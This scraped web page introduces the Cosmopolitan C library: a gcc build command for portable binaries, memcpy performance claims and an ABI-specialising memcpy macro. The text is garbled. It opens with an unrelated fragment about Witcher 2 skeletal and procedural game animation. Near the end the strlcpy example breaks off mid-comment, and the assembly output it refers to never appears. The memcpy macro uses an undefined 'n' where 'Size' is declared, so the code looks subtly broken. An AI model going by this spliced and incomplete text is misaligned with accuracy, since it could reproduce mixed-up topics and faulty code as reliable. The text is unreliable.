<figure><img src="https://lh5.googleusercontent.com/WBPNVuhqPnwXvUjbrp1UpzraK24bQT3VrXJgslGPgwWqC2M__So3SISqaiBrNytVVvy7HqVV6V64o1VFsAM5NxbzOEn5lwll6ayTOd49M5oC2rF9AAHk5ryI--vv8lqe2rCPWBoU" alt=""><figcaption>Witcher 2 trebuchets were not people, but also had “skeletons” and “bones” and were using skeletal animations!</figcaption></figure>



<h3>Animation – procedural and non-rigid</h3>



<p>The next category of animations are “procedural” and non-rigid. Procedural animations are useful for any animation that is “endless”, relatively simple, and shouldn’t loop too visibly. The most common example is <strong>leaf shimmer and branch movement</strong>.</p>

<p>
  Cosmopolitan makes C a build-once run-anywhere language, similar to
  Java, except it doesn't require interpreters or virtual machines be
  installed beforehand. Cosmo provides the same portability benefits as
  high-level languages like Go and Rust, but it doesn't invent a new
  language and you won't need to configure a CI system to build separate
  binaries for each operating system. What Cosmopolitan focuses on is
  fixing C by decoupling it from platforms, so it can be pleasant to use
  for writing small unix programs that are easily distributed to a much
  broader audience.

</p><h3>Getting Started</h3>

<p>
  Assuming you have GCC on Linux, then all you need are the five
  additional files which are linked below:

</p><pre><span># create simple c program on command line</span>
echo <span>'
  main() {
    printf("hello world\n");
  }
'</span> &gt;hello.c

<span># run gcc compiler in freestanding mode</span>
gcc -g -O -static -fno-pie -mno-red-zone -nostdlib -nostdinc -o hello.com hello.c \
  -Wl,--oformat=binary -Wl,--gc-sections -Wl,-z,max-page-size=0x1000 -fuse-ld=bfd \
  -Wl,-T,<a href="https://justine.lol/cosmopolitan/ape.lds">ape.lds</a> -include <a href="https://justine.lol/cosmopolitan/cosmopolitan.h">cosmopolitan.h</a> <a href="https://justine.lol/cosmopolitan/crt.o">crt.o</a> <a href="https://justine.lol/cosmopolitan/ape.o">ape.o</a> <a href="https://justine.lol/cosmopolitan/cosmopolitan.a">cosmopolitan.a</a>

<span># ~40kb static binary (can be ~16kb w/ MODE=tiny)</span>
./hello.com
</pre>

<p>
  The above command fixes GCC so it outputs portable binaries that will
  run on every Linux distro in addition to Mac OS X, Windows NT,
  FreeBSD, and OpenBSD too. For details on how this works, please read
  the <a title="Actually Portable Executable" href="https://justine.lol/ape.html">αcτµαlly pδrταblε εxεcµταblε</a> blog post. This
  novel binary format is also optional: conventional ELF binaries can be
  compiled too by removing the <code>-Wl,--oformat=binary</code> flag.

</p><p>
  Your program will also boot on bare metal too. In other words, you've
  written a normal textbook C program, and thanks to Cosmopolitan's
  low-level linker magic, you've effectively created your own operating
  system which happens to run on all the existing ones as well. Now
  that's something no one's done before.

</p><h3>Mailing List</h3>

<p>
  Please join
  the <a href="https://groups.google.com/g/cosmopolitan-libc">Cosmopolitan
  Cosmonauts</a> Google Group!

</p><h3>Performance</h3>

<p>
  Cosmopolitan has been optimized by hand for excellent performance on
  modern desktops and servers. Compared with glibc, you should expect
  Cosmopolitan to be almost as fast, but with an order of a magnitude
  tinier code size. Compared with Musl or Newlib, you can expect that
  Cosmopolitan will generally go much faster, while having roughly the
  same code size, if not tinier.

</p><p>
  In the case of the most important libc function, memcpy(),
  Cosmopolitan outperformed every other open source library tested. The
  chart below shows how quickly memory is transferred depending on the
  size of the copy. Since it's log scale, each grid square represents a
  2x difference in performance. What makes Cosmopolitan so fast here is
  it uses uses several different memory copying strategies. For small
  sizes it uses an indirect branch with overlapping moves; for medium
  sizes it uses simd vectors, and for large copies it uses nontemporal
  hints which prevent cache thrash. Other libraries usually fall short
  because they use a one-size-fits-all strategy. For example, Newlib
  goes 10x slower for the optimal block size (half L1 cache) because it
  always does nontemporal moves.

</p><p>
  <a href="https://justine.lol/cosmopolitan/memcpy.png">
    <img width="960" height="540" src="https://storage.googleapis.com/justine/cosmopolitan/memcpy.png" alt="memcpy() performance for varying n values"></a>

</p><h3>Trickle-Down Performance</h3>

<p>
  Performing the best on benchmarks isn't enough. Cosmopolitan also uses
  a second technique that the above benchmark doesn't measure, which we
  call "trickle-down performance". For an example of how that works,
  consider the following common fact about C which is often overlooked.
  External function calls such as the following:

</p><pre>memcpy(foo, bar, n);
</pre>

<p>
  Are roughly equivalent to the following assembly, which leads
  compilers to assume that most cpu state is clobbered:

</p><pre><span>asm volatile</span>(<span>"call memcpy"</span>
             : <span>"=a"</span>(rax), <span>"=D"</span>(rdi), <span>"=S"</span>(rsi), <span>"=d"</span>(rdx)
             : <span>"1"</span>(foo), <span>"2"</span>(bar), <span>"3"</span>(n)
             : <span>"rcx"</span>, <span>"r8"</span>, <span>"r9"</span>, <span>"r10"</span>, <span>"r11"</span>, <span>"memory"</span>, <span>"cc"</span>,
               <span>"xmm0"</span>, <span>"xmm1"</span>, <span>"xmm2"</span>, <span>"xmm3"</span>, <span>"xmm4"</span>, <span>"xmm5"</span>, <span>"xmm6"</span>);
</pre>

<p>
  In other words the compiler assumes that, in calling the function,
  fifteen separate registers and all memory will be overwritten. See
  the <a href="https://www.uclibc.org/docs/psABI-x86_64.pdf">System V
  ABI</a> for further details. This can be problematic for
  frequently-called functions such as memcpy, since it inhibits many
  optimizations and it tosses a wrench in the compiler register
  allocation algorithm, thus causing stack spillage which further
  degrades performance while bloating the output binary size.

</p><p>
  So what Cosmopolitan does for memcpy() and many other
  frequently-called core library leaf functions, is defining a simple
  macro wrapper, which tells the compiler the correct subset of the abi
  that's actually needed, e.g.

</p><pre><span>#define</span> memcpy(DEST, SRC, N) ({       \
  void *Dest = (DEST);                \
  void *Src = (SRC);                  \
  size_t Size = (N);                  \
  <span>asm</span>(<span>"call memcpy"</span>                   \
      : <span>"=m"</span>(*(<span>char</span>(*)[Size])(Dest))  \
      : <span>"D"</span>(Dest), <span>"S"</span>(Src), <span>"d"</span>(n),  \
        <span>"m"</span>(*(<span>char</span>(*)[Size])(Src))    \
      : <span>"rcx"</span>, <span>"xmm3"</span>, <span>"xmm4"</span>, <span>"cc"</span>); \
    Dest;                             \
  })
</pre>

<p>
  What this means, is that Cosmopolitan memcpy() is not simply fast, it
  also makes unrelated code in the functions that call it faster too as
  a side-effect. When this technique was first implemented for memcpy()
  alone, many of the functions in the Cosmopolitan codebase had their
  generated code size reduced by a third.

</p><p>
  For an example of one such function, consider <code>strlcpy</code>,
  which is the BSD way of saying <code>strcpy</code>:

</p><pre><span>/**
 * Copies string, the BSD way.
 *

  If we compile our <code>strlcpy</code> function, then here's the
  assembly code that the compiler outputs:

<p>
  That's a huge improvement in generated code size. The above two
  compiles used the same gcc flags and no changes to the code needed to
  be made. All that changed was we used cosmopolitan.h (instead of the
  platform c library string.h) which contains ABI specialization macros
  for <code>memcpy</code> and <code>strlen</code>. It's a great example
  of how merely choosing a better C library can systemically eliminate
  bloat throughout your entire codebase.
